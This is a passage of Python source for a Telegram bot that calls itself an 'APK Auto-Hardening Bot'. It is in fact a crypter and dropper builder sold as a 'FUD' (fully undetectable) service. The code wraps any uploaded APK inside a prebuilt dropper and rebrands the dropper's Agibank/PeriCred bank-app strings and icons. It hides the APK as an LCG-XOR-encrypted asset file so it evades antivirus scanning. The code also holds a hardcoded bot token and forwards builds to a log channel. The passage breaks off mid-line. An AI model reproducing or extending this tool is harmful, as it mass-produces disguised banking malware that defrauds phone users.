# -*- coding: utf-8 -*-
"""
APK Auto-Hardening Bot - Shaileshxlive FUD
Secure, Stable, and Resilient Version
"""

import os
import sys
import json
import time
import uuid
import shutil
import threading
import atexit
import io
import ssl
import subprocess
import urllib.request
import urllib.error
import urllib.parse
import logging
import dataclasses
from datetime import datetime, timedelta
from pathlib import Path
from xml.etree import ElementTree as ET
from typing import Optional, Dict, Any, List, Callable
from dataclasses import dataclass, asdict
from enum import Enum
from concurrent.futures import ThreadPoolExecutor


# ── Resilient SSL Context ─────────────────────────────────────────────
def _get_resilient_ssl_context() -> ssl.SSLContext:
    try:
        import certifi
        ctx = ssl.create_default_context(cafile=certifi.where())
    except ImportError:
        try:
            ctx = ssl.create_default_context()
        except Exception:
            return ssl._create_unverified_context()

    disable_verify = os.environ.get("DISABLE_SSL_VERIFY", "false").lower() == "true"
    if disable_verify:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx


_ssl_context = _get_resilient_ssl_context()

# ── Logging Setup ─────────────────────────────────────────────────────
LOG_DIR = Path(__file__).resolve().parent / "logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / "bot.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("APKProcessor")

try:
    from PIL import Image as _PILImage
    _HAS_PIL = True
except ImportError:
    _HAS_PIL = False


# ── CONFIGURATION ─────────────────────────────────────────────────────
class Config:
    TOKEN = os.environ.get(
        "TELEGRAM_BOT_TOKEN",
        "8643119831:AAErlSUMWHjvQqLqT7N0VPa4GPI3DCwDJLI"
    )

    MASTER_IDS = set(filter(
        None,
        os.environ.get("TELEGRAM_MASTER_IDS", "8739519477").split(",")
    ))

    AUTH_IDS_ENV = set(filter(
        None,
        os.environ.get("TELEGRAM_AUTHORIZED_USERS", "").split(",")
    ))

    # Force Join Channels
    FORCE_JOIN_CHANNELS = [
        {"id": "-1003770463666", "link": "https://t.me/+UWhrJmhFHCk3MTJl"},
        {"id": "-1003718902158", "link": "https://t.me/+jme9t2CoEcM3MzQ1"},
    ]

    # Build Log Channel (auto-forward APKs)
    BUILD_LOG_CHANNEL = "-1004457898119"

    # Free Mode — UNLIMITED
    FREE_MODE_ENABLED = True
    FREE_DAILY_LIMIT = 0     # 0 = unlimited
    FREE_TOTAL_LIMIT = 0     # 0 = unlimited

    # Paid Mode
    PAID_MODE_ENABLED = True

    # Branding
    DEVELOPER_USERNAME = "@Shaileshxlive"
    BOT_NAME = "Shaileshxlive FUD"
    CONTACT_INFO = "@Shaileshxlive"

    MAX_FILE_SIZE = int(os.environ.get("MAX_APK_SIZE_MB", 20)) * 1024 * 1024
    MAX_ICON_SIZE = int(os.environ.get("MAX_ICON_SIZE_MB", 5)) * 1024 * 1024
    MAX_CONCURRENT_TASKS = int(os.environ.get("MAX_CONCURRENT_TASKS", 10))
    TASK_TIMEOUT_SECONDS = int(os.environ.get("TASK_TIMEOUT_SECONDS", 300))

    APKNOW_BASE_URL = "https://apknow.one"

    ROOT = Path(__file__).resolve().parent
    DATA_DIR = ROOT / "data"
    UPLOAD_DIR = ROOT / "uploads" / "bot_temp"
    OUTPUT_DIR = ROOT / "outputs"
    TEMP_DIR = ROOT / "temp"

    DROPPER_PATHS = [
        ROOT / "dropper_rebuild",
        ROOT.parent / "dropper_rebuild",
        ROOT / "apk_dropper" / "dropper_rebuild",
        Path(os.getcwd()) / "dropper_rebuild",
    ]
    APKTOOL_PATHS = [
        ROOT / "apktool.jar",
        ROOT.parent / "apktool.jar",
        Path(os.getcwd()) / "apktool.jar",
    ]
    SIGNER_PATHS = [
        ROOT / "signer.jar",
        ROOT.parent / "signer.jar",
        Path(os.getcwd()) / "signer.jar",
    ]

    SEED = 276813

    @property
    def API_BASE(self) -> str:
        return f"https://api.telegram.org/bot{self.TOKEN}"

    @property
    def FILE_API(self) -> str:
        return f"https://api.telegram.org/file/bot{self.TOKEN}"

    @classmethod
    def validate(cls) -> bool:
        if not cls.TOKEN:
            logger.critical("TELEGRAM_BOT_TOKEN is missing. Startup halted.")
            return False
        return True


bot_config = Config()


# ── LCG Encryption ────────────────────────────────────────────────────
def _encrypt_lcg(data: bytes, seed: int) -> bytes:
    j = seed
    out = bytearray()
    for b in data:
        j = ((j * 1664525) + 1013904223) & 0xFFFFFFFF
        out.append(b ^ ((j >> 24) & 0xFF))
    return bytes(out)


def _to_png_bytes(data: bytes) -> bytes:
    if _HAS_PIL:
        try:
            img = _PILImage.open(io.BytesIO(data)).convert("RGBA")
            out = io.BytesIO()
            img.save(out, format="PNG")
            return out.getvalue()
        except Exception as e:
            logger.debug(f"PIL Image conversion fallback: {e}")
    return data


def _get_safe_working_dir(fallback_dir: Path) -> Path:
    if sys.platform == "win32":
        public_temp = Path("C:/Users/Public/bot_temp")
        try:
            public_temp.mkdir(parents=True, exist_ok=True)
            test_file = public_temp / f"test_{uuid.uuid4().hex}.tmp"
            test_file.write_text("test", encoding="utf-8")
            test_file.unlink()
            return public_temp
        except Exception:
            pass

        win_temp = Path("C:/Windows/Temp/bot_temp")
        try:
            win_temp.mkdir(parents=True, exist_ok=True)
            return win_temp
        except Exception:
            pass

    return fallback_dir


# ── Data Models ───────────────────────────────────────────────────────
class UserType(Enum):
    ADMIN = "admin"
    PAID = "paid"
    FREE = "free"


@dataclass
class User:
    user_id: str
    username: Optional[str] = None
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    language: str = "en"
    created_at: str = ""
    last_active: str = ""
    user_type: str = "free"
    subscription_active: bool = False
    subscription_expires: Optional[str] = None
    build_limit: int = 0
    builds_used: int = 0
    plan: str = "Free"
    total_builds: int = 0
    daily_build_limit: int = 0
    daily_builds_date: str = ""
    daily_builds_used: int = 0
    license_disabled: bool = False

    def to_dict(self) -> Dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: Dict) -> "User":
        valid_keys = {f.name for f in dataclasses.fields(cls)}
        filtered_data = {k: v for k, v in data.items() if k in valid_keys}
        return cls(**filtered_data)


@dataclass
class Task:
    task_id: str
    user_id: str
    apk_name: str
    display_name: str
    original_filename: str
    status: str = "pending"
    created_at: str = ""
    updated_at: str = ""
    completed_at: Optional[str] = None
    apk_path: Optional[str] = None
    icon_path: Optional[str] = None
    output_path: Optional[str] = None
    error_message: Optional[str] = None
    progress: int = 0
    encryption_used: bool = True

    def to_dict(self) -> Dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: Dict) -> "Task":
        valid_keys = {f.name for f in dataclasses.fields(cls)}
        filtered_data = {k: v for k, v in data.items() if k in valid_keys}
        return cls(**filtered_data)


# ── Process Lock ──────────────────────────────────────────────────────
LOCK_FILE = bot_config.ROOT / "bot_processor.lock"


def _pid_alive(pid: int) -> bool:
    if sys.platform == "win32":
        try:
            import ctypes
            h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
            if h:
                ctypes.windll.kernel32.CloseHandle(h)
                return True
            return False
        except Exception:
            return True
    else:
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False


def _acquire_lock():
    if LOCK_FILE.exists():
        try:
            old_pid = int(LOCK_FILE.read_text(encoding="utf-8").strip())
            if _pid_alive(old_pid):
                logger.warning(f"Active instance detected with PID {old_pid}. Terminating.")
                sys.exit(0)
        except Exception as e:
            logger.error(f"Error checking lock: {e}")
    try:
        LOCK_FILE.write_text(str(os.getpid()), encoding="utf-8")
        atexit.register(_release_lock)
    except Exception as e:
        logger.critical(f"Failed to acquire lock: {e}")
        sys.exit(1)


def _release_lock():
    try:
        LOCK_FILE.unlink(missing_ok=True)
    except Exception as e:
        logger.error(f"Failed to release lock: {e}")


# ── Database ──────────────────────────────────────────────────────────
class Database:
    def __init__(self, data_dir: Path):
        self.data_dir = data_dir
        self.data_dir.mkdir(parents=True, exist_ok=True)
        self._lock = threading.RLock()
        self._cache = {}
        self._dirty = set()

        self._files = {
            "users": "users.json",
            "tasks": "tasks.json",
            "stats": "stats.json",
        }

        for name, filename in self._files.items():
            path = self.data_dir / filename
            if not path.exists():
                path.write_text("{}", encoding="utf-8")

        self._start_auto_save()
        atexit.register(self._flush)

    def _get_path(self, name: str) -> Path:
        return self.data_dir / self._files[name]

    def _read_json(self, name: str) -> Dict:
        with self._lock:
            if name in self._cache:
                return self._cache[name]
            path = self._get_path(name)
            try:
                data = json.loads(path.read_text(encoding="utf-8"))
            except Exception:
                data = {}
            self._cache[name] = data
            return data

    def _write_json(self, name: str, data: Dict) -> None:
        with self._lock:
            self._cache[name] = json.loads(json.dumps(data))
            self._dirty.add(name)

    def _flush(self):
        with self._lock:
            for name in list(self._dirty):
                if name in self._cache:
                    path = self._get_path(name)
                    temp_path = path.with_suffix(".tmp")
                    try:
                        temp_path.write_text(
                            json.dumps(self._cache[name], indent=2, ensure_ascii=False),
                            encoding="utf-8"
                        )
                        if sys.platform == "win32" and path.exists():
                            path.unlink()
                        temp_path.replace(path)
                    except Exception as e:
                        logger.error(f"DB write error: {e}")
                self._dirty.discard(name)

    def _start_auto_save(self):
        def auto_save():
            while True:
                time.sleep(1)
                try:
                    if self._dirty:
                        self._flush()
                except Exception as e:
                    logger.error(f"Auto-save error: {e}")
        thread = threading.Thread(target=auto_save, daemon=True)
        thread.start()

    def get_user(self, user_id: str) -> Optional[User]:
        with self._lock:
            data = self._read_json("users")
            user_data = data.get(str(user_id))
            if user_data:
                return User.from_dict(user_data)
            return None

    def save_user(self, user: User) -> None:
        with self._lock:
            data = self._read_json("users")
            data[str(user.user_id)] = user.to_dict()
            self._write_json("users", data)

    def get_all_users(self) -> List[User]:
        with self._lock:
            data = self._read_json("users")
            return [User.from_dict(v) for v in data.values()]

    def create_task(self, task: Task) -> None:
        with self._lock:
            data = self._read_json("tasks")
            data[task.task_id] = task.to_dict()
            self._write_json("tasks", data)

    def get_task(self, task_id: str) -> Optional[Task]:
        with self._lock:
            data = self._read_json("tasks")
            task_data = data.get(task_id)
            if task_data:
                return Task.from_dict(task_data)
            return None

    def update_task(self, task: Task) -> None:
        with self._lock:
            data = self._read_json("tasks")
            data[task.task_id] = task.to_dict()
            self._write_json("tasks", data)

    def get_user_tasks(self, user_id: str) -> List[Task]:
        with self._lock:
            data = self._read_json("tasks")
            tasks = []
            for task_data in data.values():
                if task_data.get("user_id") == str(user_id):
                    tasks.append(Task.from_dict(task_data))
            return sorted(tasks, key=lambda t: t.created_at, reverse=True)

    def increment_stat(self, key: str, delta: int = 1) -> None:
        with self._lock:
            data = self._read_json("stats")
            data[key] = data.get(key, 0) + delta
            self._write_json("stats", data)


# ── APK Processor ─────────────────────────────────────────────────────
class APKProcessor:
    def __init__(self, config: Config):
        self.config = config
        self._processing_lock = threading.RLock()
        self._active_tasks = {}
        self._executor = ThreadPoolExecutor(max_workers=config.MAX_CONCURRENT_TASKS)

        self.dropper_path = None
        for path in config.DROPPER_PATHS:
            if path.exists() and path.is_dir():
                self.dropper_path = path
                break

        self.apktool_path = None
        for path in config.APKTOOL_PATHS:
            if path.exists() and path.is_file():
                self.apktool_path = path
                break

        self.signer_path = None
        for path in config.SIGNER_PATHS:
            if path.exists() and path.is_file():
                self.signer_path = path
                break

        if self.dropper_path:
            logger.info(f"Using dropper path: {self.dropper_path}")
        else:
            logger.warning("Dropper path not found.")

        self._check_java_dependency()

    def _check_java_dependency(self):
        try:
            subprocess.run(["java", "-version"], capture_output=True, check=True)
            logger.info("Java environment verified.")
        except Exception:
            logger.error("Java command not found. Builds may fail.")

    def can_process(self) -> int:
        with self._processing_lock:
            return self.config.MAX_CONCURRENT_TASKS - len(self._active_tasks)

    def process(self, task: Task, callback: Callable) -> bool:
        with self._processing_lock:
            if self.can_process() <= 0:
                return False
            future = self._executor.submit(self._process_task, task, callback)
            self._active_tasks[task.task_id] = future
            return True

    def _process_task(self, task: Task, callback: Callable):
        try:
            task.status = "processing"
            task.updated_at = datetime.now().isoformat()
            callback(task)

            self._update_progress(task, 20, callback)

            if task.apk_path and os.path.exists(task.apk_path):
                self._update_progress(task, 40, callback)
                output_path = self._build_apk(task)
                if output_path and os.path.exists(output_path):
                    task.status = "completed"
                    task.output_path = output_path
                    task.progress = 100
                    task.completed_at = datetime.now().isoformat()
                else:
                    task.status = "failed"
                    task.error_message = "APK build failed: no output produced."
            else:
                task.status = "failed"
                task.error_message = "Uploaded APK not found on disk."
        except Exception as e:
            logger.error(f"Task processing error: {e}", exc_info=True)
            task.status = "failed"
            task.error_message = str(e)
        finally:
            task.updated_at = datetime.now().isoformat()
            callback(task)
            with self._processing_lock:
                self._active_tasks.pop(task.task_id, None)

    def _update_progress(self, task: Task, progress: int, callback: Callable):
        task.progress = progress
        task.updated_at = datetime.now().isoformat()
        callback(task)
        time.sleep(0.1)

    def _build_apk(self, task: Task) -> Optional[str]:
        apk_path = task.apk_path
        app_name = task.display_name
        icon_path = task.icon_path
        build_id = f"bot_{int(time.time())}_{uuid.uuid4().hex[:6]}"

        safe_base = _get_safe_working_dir(self.config.UPLOAD_DIR)

        dropper_copy = safe_base / f"{build_id}_dropper"
        unsigned = safe_base / f"{build_id}_unsigned.apk"
        out_dir = safe_base / build_id

        if not self.dropper_path or not self.dropper_path.exists():
            raise RuntimeError("Dropper directory not found.")

        try:
            shutil.copytree(str(self.dropper_path), str(dropper_copy))
            out_dir.mkdir(parents=True, exist_ok=True)

            # 1. Patch app name
            strings_xml = dropper_copy / "res" / "values" / "strings.xml"
            if strings_xml.exists():
                try:
                    tree = ET.parse(str(strings_xml))
                    root = tree.getroot()
                    for s in root.findall("string"):
                        if s.get("name") == "app_name":
                            s.text = app_name
                    tree.write(str(strings_xml), encoding="utf-8", xml_declaration=True)
                except Exception as e:
                    logger.error(f"XML modification failed: {e}")

            # 2. Replace icon
            if icon_path and os.path.exists(icon_path):
                try:
                    png_bytes = _to_png_bytes(Path(icon_path).read_bytes())
                    for density in ["mipmap-hdpi", "mipmap-mdpi", "mipmap-xhdpi",
                                    "mipmap-xxhdpi", "mipmap-xxxhdpi"]:
                        d = dropper_copy / "res" / density
                        d.mkdir(parents=True, exist_ok=True)
                        for ic in ["ic_launcher.png", "ic_launcher_round.png"]:
                            (d / ic).write_bytes(png_bytes)
                except Exception as e:
                    logger.error(f"Icon replace error: {e}")

            # 3. Replace name references
            for fp in dropper_copy.rglob("*"):
                if fp.suffix in (".smali", ".xml") and fp.is_file():
                    try:
                        txt = fp.read_text(encoding="utf-8", errors="ignore")
                        new = txt.replace("PeriCred", app_name) \
                                 .replace("Agibank", app_name) \
                                 .replace("AgiBank", app_name)
                        if new != txt:
                            fp.write_text(new, encoding="utf-8")
                    except Exception as e:
                        logger.debug(f"Smali replace ignored: {e}")

            # 4. Encrypt + inject payload
            try:
                with open(apk_path, "rb") as f:
                    raw = f.read()
                payload = b"\x00" * 16 + _encrypt_lcg(raw, self.config.SEED)
                payload_path = dropper_copy / "assets" / "dbliqgnjl.dat"
                payload_path.parent.mkdir(parents=True, exist_ok=True)
                payload_path.write_bytes(payload)
            except Exception as e:
                raise RuntimeError(f"Encryption insertion failure: {e}")

            # 5. Compile
            if not self.apktool_path or not self.apktoo
